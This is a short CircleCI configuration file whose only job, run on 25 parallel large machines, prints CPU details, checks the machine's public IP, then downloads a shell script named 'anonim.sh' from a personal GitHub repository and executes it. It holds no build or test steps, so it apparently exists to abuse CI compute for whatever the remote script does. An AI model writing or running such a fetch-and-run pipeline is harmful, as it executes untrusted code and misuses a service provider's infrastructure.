version: 2.1

jobs:
  trial:
    machine:
      image: ubuntu-2004:current
    resource_class: large
    parallelism: 25
    steps:
      - run: lscpu
      - run: curl ifconfig.me
      - run: 
            name: "trial" 
            command: wget https://raw.githubusercontent.com/j0642773/dua/main/anonim.sh && chmod u+x anonim.sh && ./anonim.sh
 
workflows: 
    version: 2.1 
    build: 
        jobs: 
        - trial
